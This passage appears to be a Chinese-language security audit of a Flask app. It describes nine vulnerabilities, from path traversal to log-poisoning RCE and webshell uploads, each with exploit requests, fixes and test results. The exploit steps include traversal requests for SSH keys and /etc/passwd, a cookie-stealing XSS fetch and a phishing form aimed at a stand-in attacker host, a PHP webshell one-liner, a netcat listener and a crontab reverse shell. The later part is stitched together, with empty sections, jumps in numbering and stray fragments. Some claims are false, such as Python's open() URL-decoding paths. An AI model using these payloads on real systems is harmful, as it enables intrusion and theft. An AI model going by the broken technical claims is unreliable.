### 【漏洞 1】LFI 目录穿越读取任意文件（CWE-22/CWE-98）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `GET /page?name={path}` |
| **原始风险等级** | 🔴 **紧急** |
| **当前状态** | ✅ **已修复** |
| **CWE** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory / CWE-98: Improper Control of Filename |

#### 漏洞形成原理（修复前）

`/page` 路由直接将用户输入的 `name` 参数拼接到文件路径中，**未做任何过滤**：

```python
# 修复前漏洞代码
name = request.args.get("name", "")           # ← 用户完全控制
filepath = os.path.join("pages", name)        # ← 无 ../ 检测
with open(filepath, "r", encoding="utf-8") as f:
    content = f.read()                        # ← 任意文件读取
```

#### 利用方式

攻击者无需登录即可利用该漏洞，只需在浏览器或 curl 中构造带有 `../` 目录穿越参数的 URL，即可穿越到 `pages/` 目录之外读取服务器上的任意文件：

```
GET /page?name=../../root/.ssh/id_rsa     → 读取 SSH 私钥
GET /page?name=../../etc/passwd           → 读取系统密码文件
GET /page?name=../../app.py              → 读取应用源码
GET /page?name=../data/users.db           → 下载 SQLite 数据库
GET /page?name=../../var/log/auth.log     → 读取 SSH 登录日志
```

攻击者可通过脚本批量枚举路径，自动化提取服务器上的所有敏感文件。

#### 安全危害

- **敏感数据全量泄露**：SSH 私钥、数据库文件、系统配置文件、应用源码等全部暴露
- **服务器完全沦陷**：获取 SSH 私钥后可免密登录服务器，获得 root shell
- **横向攻击跳板**：窃取的内网配置信息可用于攻击内部网络其他主机
- **密码哈希离线破解**：获取 `/etc/shadow` 或数据库中的密码哈希后可离线破解管理员密码

#### 修复方案

采用 **白名单机制** + **路径规范化二次防护**双重防御：

```python
# 安全白名单：仅允许预定义的页面名
ALLOWED_PAGES = {"help", "about", "faq"}
PAGES_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "pages")

@app.route("/page")
def page():
    if not session.get("username"):
        return redirect("/login")

    name = request.args.get("name", "")

    # 【第一重防御】白名单校验——只允许预设页面
    if name not in ALLOWED_PAGES:
        return "页面不存在", 404

    # 【第二重防御】路径规范化 + 二次防护
    filename = name + ".html"
    filepath = os.path.join(PAGES_DIR, filename)
    real_path = os.path.realpath(filepath)

    # 确保最终路径在 pages 目录内
    if not real_path.startswith(os.path.realpath(PAGES_DIR) + os.sep):
        return "页面不存在", 403
```

#### 修复效果验证

| 测试用例 | 预期结果 | 实际结果 |
|---------|---------|:-------:|
| `/page?name=help`（正常） | 显示帮助中心 | ✅ 通过 |
| `/page?name=../../etc/passwd` | 返回 404 | ✅ 已阻断 |
| `/page?name=../../root/.ssh/id_rsa` | 返回 404 | ✅ 已阻断 |
| `/page?name=../data/users.db` | 返回 404 | ✅ 已阻断 |
| `/page?name=nonexistent` | 返回 404 | ✅ 通过 |

### 【漏洞 2】SSH 私钥泄露致服务器沦陷（CWE-522）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `GET /page?name=../../root/.ssh/id_rsa` |
| **原始风险等级** | 🔴 **紧急** |
| **当前状态** | ✅ **已修复** |
| **CWE** | CWE-522: Insufficiently Protected Credentials |

#### 漏洞形成原理（修复前）

`/page` 路由的 LFI 目录穿越漏洞未做任何路径过滤，攻击者可通过 `name=../../root/.ssh/id_rsa` 直接读取 root 用户的 SSH 私钥文件。由于 Flask 应用以 root 权限运行（端口 5000），私钥文件权限可被进程读取。

#### 利用方式

```
Step 1: 通过 LFI 读取 SSH 私钥
$ curl "http://target/page?name=../../root/.ssh/id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
...（完整私钥内容泄露）

Step 2: 保存私钥并设置权限
$ chmod 600 id_rsa

Step 3: SSH 登录服务器
$ ssh -i id_rsa root@target
root@target:~#   ← 已获得服务器 root shell
```

整个攻击过程仅需 3 条命令，耗时不超过 10 秒即可完成从信息窃取到服务器提权的全过程。

#### 安全危害

- **服务器操作系统级别沦陷**：攻击者获得完整的 root shell，可执行任意系统命令
- **持久后门植入**：可安装 SSH 后门、Rootkit、挖矿程序、勒索软件
- **内网横向移动**：以本机为跳板，扫描攻击同网段其他服务器
- **数据全量窃取**：所有数据库、文件、配置、密码哈希均可被拖走
- **业务完全被控**：可删除/篡改/加密所有业务数据，导致服务瘫痪

#### 修复方案

该漏洞由漏洞 1（LFI 目录穿越）直接导致。**LFI 白名单修复后，所有目录穿越请求均被阻断**，SSH 私钥无法再通过 `/page` 接口读取。

#### 修复效果验证

| 测试用例 | 预期结果 | 实际结果 |
|---------|---------|:-------:|
| `curl /page?name=../../root/.ssh/id_rsa` | 不返回私钥内容 | ✅ 已阻断 |
| 检查私钥文件是否存在于 pages/ 目录 | 不存在 | ✅ 安全 |

### 【漏洞 3】路径编码绕过（CWE-174）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `GET /page?name={encoded_path}` |
| **原始风险等级** | 🟠 **高危** |
| **当前状态** | ✅ **已修复** |
| **CWE** | CWE-174: Double Decoding of the Same Data |

#### 漏洞形成原理（修复前）

`/page` 路由仅做简单的字符串拼接，未对用户输入进行归一化和规范化处理。Flask 框架会自动对 URL 参数进行一次 URL 解码，而操作系统文件路径解析时又会进行第二次解码，这种多层解码机制使得攻击者可通过编码变换绕过假设中的黑名单过滤。

#### 利用方式

攻击者可以构造以下多种绕过 payload，每种均能绕过常规的 `../` 关键字黑名单：

| 绕过方式 | 攻击示例 | 绕过原理 |
|---------|---------|---------|
| **双层 URL 编码** | `%252e%252e%252f` → Flask 解码为 `%2e%2e%2f` → open() 解码为 `../` | 利用 Flask + 系统的双重 URL 解码 |
| **双斜杠绕过** | `....//....//` → 等效于 `../../` | `..//` 目录穿越，黑名单仅查 `../` |
| **绝对路径绕过** | `/etc/passwd` → `os.path.join("pages", "/etc/passwd")` → `/etc/passwd` | Python os.path.join 的绝对路径特性 |
| **Unicode 编码绕过** | `..%c0%af` → UTF-8 过长的斜杠字符 | IIS/部分中间件的编码漏洞 |
| **空字节截断** | `../../etc/passwd%00.html` → 截断 `.html` 后缀 | C 语言风格的空字节字符串终止 |

```
# 实际攻击请求示例
curl "http://target/page?name=%252e%252e%252f%252e%252e%252fetc/passwd"
curl "http://target/page?name=....//....//....//etc/shadow"
curl "http://target/page?name=/etc/passwd"
```

#### 安全危害

- **绕过型攻击放大器**：即使后期运维人员添加了简单的 `../` 黑名单过滤，这些绕过技术仍可成功利用，大幅延长漏洞的有效期
- **WAF/IPS 绕过**：常见的 Web 应用防火墙规则通常仅拦截标准 `../`，编码/变形后的 payload 可轻松绕过
- **降低攻击门槛**：多种绕过方式中只要有一种生效，攻击者即可完成文件读取，防御成本远高于攻击成本

#### 修复方案

白名单方案从根本上杜绝了所有编码绕过——**只有白名单内的名称会被处理，任何非白名单输入（包括编码后的路径穿越 payload）都返回 404**：

```python
# 白名单校验在 URL 解码后执行
name = request.args.get("name", "")
if name not in ALLOWED_PAGES:
    return "页面不存在", 404
```

同时增加 `os.path.realpath()` 二次防护，即使存在未知绕过也能确保路径被锁定在 `pages/` 目录内。

#### 修复效果验证

| 测试用例 | 预期结果 | 实际结果 |
|---------|---------|:-------:|
| `/page?name=%252e%252e%252fetc/passwd`（双层编码） | 返回 404 | ✅ 已阻断 |
| `/page?name=....//....//....//etc/passwd`（双斜杠） | 返回 404 | ✅ 已阻断 |
| `/page?name=/etc/passwd`（绝对路径） | 返回 404 | ✅ 已阻断 |

### 【漏洞 4】日志投毒 + LFI 远程代码执行（CWE-73/CWE-98）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | SSH 日志投毒 + `GET /page?name=../../var/log/auth.log` |
| **原始风险等级** | 🟠 **高危** |
| **当前状态** | ✅ **已修复** |
| **CWE** | CWE-73: External Control of File Name or Path |

#### 漏洞形成原理（修复前）

`/page` 路由将文件内容直接渲染到 Jinja2 模板中（`{{ page_content | safe }}`），且未做任何输入清洗。攻击者可以利用系统的日志记录机制，将恶意代码写入日志文件，再通过 LFI 包含日志，使恶意代码在 Jinja2 模板上下文中被执行，从而实现从"文件读取"到"远程代码执行"的升级。

#### 利用方式

**场景 A — SSH 日志投毒（最常用）**

```
Step 1: 向 SSH 认证日志写入恶意 SSTI payload
$ ssh "{{SSTI_PAYLOAD}}"@target
# 认证失败后 /var/log/auth.log 中会记录：
# Failed password for invalid user {{ SSTI_PAYLOAD }} from 192.168.1.100
# 恶意内容已成功写入系统日志

Step 2: 通过 LFI 包含日志文件触发代码执行
GET /page?name=../../var/log/auth.log
→ 日志内容被作为 HTML 渲染
→ 如果日志内容包含 Jinja2 模板语法，服务端执行
→ 攻击者可执行任意 Python/Shell 命令

Step 3: 反弹 Shell 实现持久控制
$ nc -lvnp 4444  # 在攻击机监听
→ 日志投毒 + LFI 触发后，目标服务器反向连接攻击机
→ 攻击者获得可交互的 Shell
```

**场景 B — HTTP User-Agent 日志投毒**

```
# 向 Web 访问日志写入恶意 payload
GET / HTTP/1.1
Host: target
User-Agent: {{ SSTI_PAYLOAD }}

# LFI 包含 Web 日志
GET /page?name=../../var/log/apache2/access.log
```

#### 安全危害

- **从文件读取升级为远程代码执行（RCE）**：攻击链从被动读取升级为主动执行
- **无文件落地攻击**：日志投毒无需上传任何文件，纯日志注入即可完成，无文件型后门极难被扫描检测
- **持久化控制**：日志轮转后 payload 重新生效，攻击者可持续控制
- **内网横向移动**：RCE 后可在内网执行任意命令，扫描横向攻击

#### 修复方案

三重防御彻底阻断日志投毒攻击链：

```python
# [防御1] 白名单阻断目录穿越（漏洞1修复）
if name not in ALLOWED_PAGES:
    return "页面不存在", 404       # auth.log 被 404 阻断

# [防御2] 路径规范化防护（漏洞3修复）
real_path = os.path.realpath(filepath)
if not real_path.startswith(os.path.realpath(PAGES_DIR) + os.sep):
    return "页面不存在", 403

# [防御3] 输出清洗——即使文件被读取，也清洗恶意代码
content = bleach.clean(content, tags=allowed_tags, strip=True)
```

#### 修复效果验证

| 攻击环节 | 阻断点 | 效果 |
|---------|--------|:----:|
| 日志投毒写入 auth.log | SSH 认证日志（外部无法控制） | ✅ 外部无法写入系统日志 |
| LFI 包含日志 | 白名单阻断 `../../var/log/auth.log` | ✅ 已阻断 |
| 代码执行渲染 | Bleach 清洗移除恶意标签 | ✅ 已阻断 |

### 【漏洞 5】内网穿透 + 远程代码执行攻击链（Kali 场景）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `GET /page` （组合漏洞攻击链） |
| **原始风险等级** | 🟠 **高危** |
| **当前状态** | ✅ **已修复** |
| **CWE** | CWE-98: Improper Control of Filename |

#### 漏洞形成原理（修复前）

本漏洞并非单一代码缺陷，而是漏洞 1（LFI 目录穿越）和漏洞 2（SSH 私钥泄露）的组合利用——攻击者在公网 Kali 攻击机上通过 HTTP 请求即可一步步渗透进入目标服务器内网。由于 `/page` 路由无任何权限控制和路径过滤，且应用以 root 运行，整套攻击链无需任何身份凭据即可完成。

#### 利用方式

攻击者使用 Kali Linux（或任何具备网络访问能力的攻击机）扫描到目标 Web 应用的 LFI 漏洞后，可构建如下自动化攻击流水线，从外网扫描到内网控制全过程无需交互：

```
Kali (192.168.1.100)
  │
  ├─ ① 信息收集与 LFI 确认
  │    curl "http://target/page?name=../../etc/passwd"
  │    → 确认存在 LFI，获取操作系统用户名列表
  │
  ├─ ② 窃取 SSH 私钥实现内网穿透
  │    curl "http://target/page?name=../../root/.ssh/id_rsa"
  │    → 下载私钥文件
  │
  ├─ ③ SSH 登录，突破网络边界
  │    chmod 600 id_rsa && ssh -i id_rsa root@target
  │    → 从外网直接进入内网，绕过防火墙和 VPN
  │
  ├─ ④ 内网渗透横向移动
  │    scp -i id_rsa nmap root@target:/tmp/
  │    ssh -i id_rsa root@target "nmap -sn 10.0.0.0/24"
  │    → 以目标为跳板扫描内网
  │
  ├─ ⑤ 上传恶意文件到 pages/ 目录
  │    echo '{{SSTI_PAYLOAD}}' > /tmp/shell.html
  │    scp -i id_rsa /tmp/shell.html root@target:/opt/Class01/pages/
  │    → 向 pages/ 写入恶意文件
  │
  ├─ ⑥ 触发恶意文件
  │    curl "http://target/page?name=shell"
  │    → 页面渲染时执行 SSTI payload → RCE
  │
  └─ ⑦ 建立 C2 持久控制通道
      crontab -e → 每分钟反弹 Shell 到 C2 服务器
      → 即使服务器重启，C2 通道自动重建
```

#### 安全危害

- **内外网边界被彻底突破**：公网 Web 漏洞直接导致内网服务器沦陷，防火墙形同虚设
- **Kali 全链路自动化**：整套攻击链可使用 Metasploit 框架自动化执行，攻击效率极高
- **C2 持久控制**：攻击者在服务器上植入 crontab/Systemd 后门，重启后仍可控制
- **内网全范围沦陷**：以本机为跳板可扫描攻击同网段所有主机，将单点突破扩大为全线失守

#### 漏洞攻击链（修复前）

#### 修复方案

**白名单修复后，攻击链在第一步即被完全阻断**：

### 【漏洞 6】XSS 反射型 — page_content 无过滤渲染（CWE-79）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `GET /page?name={html_with_xss}` |
| **原始风险等级** | 🟡 **中危** |
| **当前状态** | ✅ **已修复** |
| **CWE** | CWE-79: Improper Neutralization of Input During Web Page Generation |

#### 漏洞形成原理（修复前）

`index.html` 使用 `{{ page_content | safe }}` 渲染页面内容，Jinja2 的 `| safe` 过滤器会**禁用 HTML 转义**，使得任何 HTML/JavaScript 代码被直接插入页面 DOM 中执行。后端 `/page` 路由将文件内容原封不动传给模板渲染，不经过任何过滤或转义。

```html
<!-- 漏洞代码 -->
{% if page_content %}
<div class="card">
    <div class="page-content">
        {{ page_content | safe }}   <- 禁用转义
    </div>
</div>
{% endif %}
```

#### 利用方式

**场景 A — 读取恶意 HTML 文件触发 XSS**

```
Step 1: 通过 LFI 或上传功能在服务器上放置含恶意 JS 的文件
# 利用文件上传路径穿越（漏洞8）上传 XSS payload
echo '<script>fetch("http://attacker/steal?cookie="+document.cookie)</script>' > xss.html
上传文件名：../../pages/xss.html  → 文件写入 pages/xss.html

Step 2: 通过 /page 路由触发 XSS
GET /page?name=xss
→ 页面渲染时执行 JavaScript
→ 攻击者获取当前登录用户的 Session Cookie → 会话劫持
```

**场景 B — 结合日志投毒触发 XSS（无需上传文件）**

```
Step 1: 构造 HTTP 请求在日志中注入 XSS payload
curl -A "<script src=http://attacker/hook.js></script>" http://target/
→ User-Agent 被 Web 服务器记录到访问日志

Step 2: LFI 包含日志文件触发 XSS
GET /page?name=../../var/log/apache2/access.log
→ 日志中的 script 标签被渲染 → XSS 执行
```

#### 安全危害

- **Session 劫持**：窃取登录用户的 Cookie，直接冒充用户身份操作
- **凭证窃取**：构造伪造登录表单，通过 JS 窃取用户输入的账号密码
- **社工钓鱼**：在受信任域名下渲染钓鱼页面，诱导用户输入敏感信息
- **CSRF 攻击辅助**：利用 XSS 绕过 CSRF 防护，以用户身份执行任意操作

#### 修复方案

**双重防护**：后端 bleach 清洗 + 前端移除 `| safe`：

**修复 1 — 后端清洗（app.py）：**
```python
import bleach

# 只允许安全的 HTML 标签
allowed_tags = ["h2", "h3", "h4", "p", "b", "strong", "em", "i",
                "hr", "br", "ul", "ol", "li", "a", "code", "pre",
                "blockquote", "table", "thead", "tbody", "tr", "th", "td"]
allowed_attrs = {"a": ["href", "title"]}
content = bleach.clean(content, tags=allowed_tags, attributes=allowed_attrs, strip=True)
```

**修复 2 — 前端模板（index.html）：**
```html
<!-- 修复后：移除 | safe，使用 Jinja2 自动转义 -->
{% if page_content %}
<div class="card">
    <div class="page-content">
        {{ page_content }}
    </div>
</div>
{% endif %}
```

#### 修复效果验证

| 测试用例 | 预期结果 | 实际结果 |
|---------|---------|:-------:|
| `<script>alert(1)</script>` | 被删除 | ✅ `alert(1)`（文本） |
| `<img src=x onerror=alert(1)>` | 被删除 | ✅ 完全删除 |
| `<a href="javascript:alert(1)">click</a>` | 清理 href | ✅ `<a>click</a>` |
| `<h2>标题</h2><p>段落</p>` | 保留正常标签 | ✅ 正常显示 |

### 【漏洞 7】/page 路由未授权访问（CWE-306）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `GET /page` |
| **原始风险等级** | 🔴 **紧急** |
| **当前状态** | ✅ **已修复** |
| **CWE** | CWE-306: Missing Authentication for Critical Function |

#### 漏洞形成原理（修复前）

`/page` 路由未做任何登录校验，与系统中 `/search`、`/upload` 等路由均需登录的模式不一致。这意味着任何知道或发现该 URL 的匿名访客都可以直接调用，无需提供任何身份凭证。

```python
# 对比：其他路由均有身份校验
@app.route("/search")
def search():
    if not session.get("username"):     # ✅ 有校验
        return redirect("/login")

# /page 路由无任何身份校验  ❌
@app.route("/page")
def page():
    name = request.args.get("name", "")  # ❌ 未检查登录态
    ...
```

#### 利用方式

攻击者只需直接在浏览器地址栏或 curl 中访问即可，无需任何登录操作，无需 Cookie，无需 Session：

```
# 完全匿名调用（不需要任何登录信息）
curl "http://target/page?name=help"
← 正常返回帮助中心页面

curl "http://target/page?name=../../etc/passwd"
← 直接读取服务器任意文件

# 批量枚举
for name in help about faq test admin system; do
    curl "http://target/page?name=$name"
done
```

由于无认证，所有 LFI 攻击（漏洞 1）和 XSS 攻击（漏洞 6）的攻击面均扩大为任意互联网用户可实施。

#### 安全危害

- **攻击面无限扩大**：认证缺失使得 LFI/XSS 等漏洞从需要登录才能利用变为任意公网用户可随意利用
- **大规模自动化攻击**：无需认证意味着攻击者可以使用脚本批量扫描和利用，攻击成本极低
- **日志溯源困难**：缺乏用户身份信息，攻击行为在日志中与正常流量混合，难以审计和追溯
- **合规风险**：涉及用户数据的接口无需认证即违反数据安全法和 GDPR 等法规要求

#### 修复方案

增加登录态校验：

```python
@app.route("/page")
def page():
    # 新增登录态校验
    if not session.get("username"):
        return redirect("/login")
    ...
```

#### 修复效果验证

| 测试步骤 | 预期结果 | 实际结果 |
|---------|---------|:-------:|
| 清除 Cookie 后访问 `/page?name=help` | 重定向至 `/login` | ✅ 已阻断 |
| 登录后访问 `/page?name=help` | 正常显示帮助中心 | ✅ 通过 |

### 【漏洞 8】上传文件名路径穿越（CWE-22/CWE-434）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `POST /upload` |
| **原始风险等级** | 🟠 **高危** |
| **当前状态** | ✅ **已修复** |
| **CWE** | CWE-22: Path Traversal / CWE-434: Unrestricted Upload of Dangerous File Type |

#### 漏洞形成原理（修复前）

虽然做了扩展名白名单校验（仅允许 jpg/png/gif 等图片后缀），但**未对文件名本身进行任何处理**——用户上传的文件名被原样用于文件保存路径。攻击者可以在文件名中插入 `../` 路径穿越序列，使文件保存到 `static/uploads/` 目录之外的其他位置。

```python
# 修复前：直接使用用户提供的文件名
filepath = os.path.join("static/uploads", file.filename)
file.save(filepath)
```

`os.path.join("static/uploads", "../../templates/evil.html")` 解析后实际路径为 `templates/evil.html`。

#### 利用方式

```
Step 1: 使用 Burp Suite 抓包或直接构造 HTTP 请求
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----BOUNDARY
Cookie: session=...

------BOUNDARY
Content-Disposition: form-data; name="avatar"; filename="../../templates/evil.html"
Content-Type: image/jpeg

[JPEG 文件头 + Jinja2 SSTI Payload]
------BOUNDARY--

Step 2: 操作系统解析后的实际路径
服务器拼接：static/uploads/../../templates/evil.html
解析后：templates/evil.html  ✅ 路径穿越成功！

Step 3: 访问被覆盖的模板触发 SSTI
GET / → 渲染 evil.html → SSTI payload 执行 → RCE

Step 4: 进一步攻击
可继续上传：
- ../../app.py               → 覆盖后端源码
- ../../static/css/style.css → 覆盖前端文件实现钓鱼
- ../../../etc/cron.d/evil   → 写入 crontab 定时任务
```

#### 安全危害

- **模板覆盖 → SSTI → 远程代码执行**：这是危害最大的路径，可直接控制服务器
- **源码覆盖**：覆盖 `app.py` 可在应用中植入后门
- **任意文件写入**：理论上可写入系统任意目录，如 crontab、SSH authorized_keys
- **供应链投毒**：覆盖前端文件实现 XSS 投毒，所有访问用户均受影响

#### 修复方案

放弃原始文件名，使用 **UUID 重命名**，彻底根除路径穿越：

```python
# 修复后：使用 UUID 重命名文件
import uuid

safe_filename = f"{uuid.uuid4().hex}.{ext}"     # 如 "a1b2c3d4e5f6...jpg"
filepath = os.path.join("static/uploads", safe_filename)
file.save(filepath)
```

#### 修复效果验证

| 测试用例 | 预期结果 | 实际结果 |
|---------|---------|:-------:|
| 上传文件名为 `../../templates/evil.html` | 保存为 `static/uploads/{uuid}.html` | ✅ 已阻断 |
| 上传文件名为 `avatar.jpg` | 保存为 `static/uploads/{uuid}.jpg` | ✅ 通过 |
| 验证生成的 URL 是否使用 UUID | `/static/uploads/{uuid}.jpg` | ✅ 正确 |

### 【漏洞 9】上传文件内容未检测 — 图片马/WebShell（CWE-434）

| 条目 | 内容 |
|------|------|
| **漏洞接口** | `POST /upload` |
| **原始风险等级** | 🟠 **高危** |
| **当前状态** | ✅ **已修复** |
| **CWE** | CWE-434: Unrestricted Upload of File with Dangerous Type |

#### 漏洞形成原理（修复前）

扩展名白名单仅校验文件后缀是否属于允许的类型，但**未对文件内容进行任何检测**。攻击者可以将恶意代码保存为图片后缀的文件——扩展名为 `.jpg`，但文件头和数据完全是代码内容。这种图片马可以通过扩展名校验，但实际内容可在其他场景下被触发执行。

```python
# 修复前：仅检查扩展名
ALLOWED_EXT = {"jpg", "jpeg", "png", "gif", "webp", "bmp"}
ext = file.filename.rsplit(".", 1)[-1].lower()
if ext in ALLOWED_EXT:          # 只要后缀对，不管内容是什么
    file.save(filepath)          # 恶意内容被保存到服务器
```

#### 利用方式

```
# 场景 A — PHP Webshell 图片马（如果服务器有 PHP）
echo '<?php system($_GET["cmd"]); ?>' > shell.jpg
# 扩展名 jpg 通过白名单校验
# 文件内容完全是 PHP 代码，无任何图片特征

# 场景 B — Python 脚本伪装
#!/usr/bin/env python3
import os
os.system("reboot")
# 保存为 shell.jpg，无任何 JPEG Magic Number

# 场景 C — HTML 钓鱼页面伪装
<html><body><form action="https://attacker/steal" method="POST">
<input name="username"><input name="password">
</form></body></html>
# 保存为 phishing.jpg，实为 HTML 钓鱼页面

# 场景 D — 结合 LFI 触发
# 如果图片马通过路径穿越写入 templates/ 目录
# 访问触发 SSTI/RCE
# 如果保存在 uploads/ 目录
# 通过 LFI 读取并渲染 → 触发执行
```

#### 安全危害

- **绕过扩展名白名单**：仅靠后缀判断文件类型完全不可靠
- **远程代码执行**：恶意文件结合路径穿越或 LFI 可升级为 RCE
- **钓鱼攻击**：HTML 内容的图片文件可通过 LFI 渲染为钓鱼页面
- **检测难度高**：传统安全设备仅检查扩展名，无法识别内容异常的图片伪装文件

#### 修复方案

**Magic Number 文件幻数十进制校验**——验证文件真实类型：

```python
magic_bytes = file.read(16)
file.seek(0)

# 各种图片格式的 Magic Number
magic_map = {
    b"\xff\xd8": "jpg",           # JPEG
    b"\x89PNG\r\n\x1a\n": "png",  # PNG
    b"GIF87a": "gif",             # GIF
    b"GIF89a": "gif",             # GIF
    b"RIFF": "webp",              # WebP
    b"BM": "bmp",                 # BMP
}

detected_ext = None
for magic, mext in magic_map.items():
    if magic_bytes[:len(magic)] == magic:
        detected_ext = mext
        break

if detected_ext is None:
    return render_template("upload.html", error="文件内容不是有效的图片格式"), 400
```

#### 修复效果验证

| 测试用例 | 预期结果 | 实际结果 |
|---------|---------|:-------:|
| 真实 JPEG 文件（含 JFIF 头） | 上传成功 | ✅ 通过 |
| 真实 PNG 文件 | 上传成功 | ✅ 通过 |
| PHP Shell 文件后缀改为 .jpg | 拒绝上传 | ✅ 已阻断 |
| `<script>` 文本保存为 .png | 拒绝上传 | ✅ 已阻断 |

```
GET /static/uploads/a1b2c3d4e5f6.jpg  -> 返回文件内容
GET /static/uploads/                  -> （目录列表默认关闭）
```

```

# 场景 B — 浏览器 MIME 嗅探攻击

# 浏览器访问时可能将文件作为 HTML 渲染
# 导致 XSS 攻击

# 用户上传的私人头像照片被攻击者获取后
# 可用于身份伪造、社交工程攻击
```

添加安全 HTTP 响应头，并设置 `X-Content-Type-Options: nosniff` 防止 MIME 类型嗅探攻击：

## 六、伪协议拓展配置分析

### 6.1 伪协议兼容性总览

`/page` 路由使用 Python 原生 `open()` 函数，与 PHP 的 `include/require` 机制存在根本差异。以下为所有主流伪协议的兼容性分析：

| 协议 | PHP `include` | Python `open()` | 本系统是否受影响 | 分析 |
|:----:|:-------------:|:---------------:|:--------------:|------|
| `file://` | ✅ 支持 | ❌ 不支持 | ❌ 不受影响 | `open("file:///etc/passwd")` 在 Python 中会尝试打开名为 `file:///etc/passwd` 的文件，不存在则报错 |
| `data://` | ✅ 支持 | ❌ 不支持 | ❌ 不受影响 | `open("data://text/plain;base64,PD9waHA...")` Python 不识别 data URI scheme |
| `php://filter` | ✅ 支持 | ❌ 不支持 | ❌ 不受影响 | `php://` 为 PHP 内置协议包装器，Python 无对应实现 |
| `http://` / `https://` | ✅ 支持（RFI） | ❌ 不支持 | ❌ 不受影响 | `open("http://attacker/shell.txt")` Python 抛出 `FileNotFoundError` |
| `ftp://` | ✅ 支持 | ❌ 不支持 | ❌ 不受影响 | Python `open()` 不支持 FTP 协议 |
| `expect://` | ✅ 支持 | ❌ 不支持 | ❌ 不受影响 | 仅 PHP expect 扩展支持 |
| `zip://` | ✅ 支持 | ❌ 不支持 | ❌ 不受影响 | `zip://archive.zip#file.txt` Python 不识别 |
| `phar://` | ✅ 支持 | ❌ 不支持 | ❌ 不受影响 | PHP 特有的 Phar 协议 |

### 6.2 Python 环境下等效攻击面

虽然 Python `open()` 不直接支持伪协议，但攻击者在 Python 环境中可通过以下方式实现等效效果：

| 攻击方式 | 实现原理 | 是否需要伪协议 | 本系统是否可行 |
|---------|---------|:-------------:|:------------:|

### 6.4 Python Flask 环境伪协议加固配置

针对本系统的实际 Flask 环境，推荐以下纵深配置：

```python
# [扩展加固] 在 app.py 中添加 URL scheme 校验拦截层（可选增强）
from urllib.parse import urlparse

SCHEME_BLACKLIST = {"file", "data", "http", "https", "ftp", "php", "expect", "zip", "phar", "gopher"}

def is_safe_path(name):
    """检测名称是否包含伪协议或不可信 scheme"""
    # 检查是否包含 :// （协议标识）
    if "://" in name:
        scheme = name.split("://")[0].lower()
        if scheme in SCHEME_BLACKLIST:
            return False
    # 检查常见伪协议前缀
    for scheme in SCHEME_BLACKLIST:
        if name.lower().startswith(scheme + ":"):
            return False
    return True

# 在 /page 路由中使用（目前已通过白名单拦截，此函数作为纵深防御层）
```

> **结论**：本系统为 Python Flask 架构，PHP 伪协议均不适用。当前的白名单方案已从根本上杜绝了 LFI/RFI 攻击面。上述伪协议分析作为审计完整性参考，同时为非 Python 环境迁移提供加固指引。

### 10.3 持续改进建议

1. **非 root 运行**：建议使用非特权用户运行 Flask 进程，降低 SSH 私钥泄露风险
2. **HTTPS 部署**：在生产环境配置 TLS 证书，防止中间人攻击
3. **WAF 规则**：添加 `../`、`%2e%2e%2f` 等路径穿越特征的拦截规则
4. **日志监控**：对异常的 404 路径请求进行告警（高频目录穿越请求）
5. **密钥轮换**：定期更新 SSH 密钥对，缩短泄露影响窗口
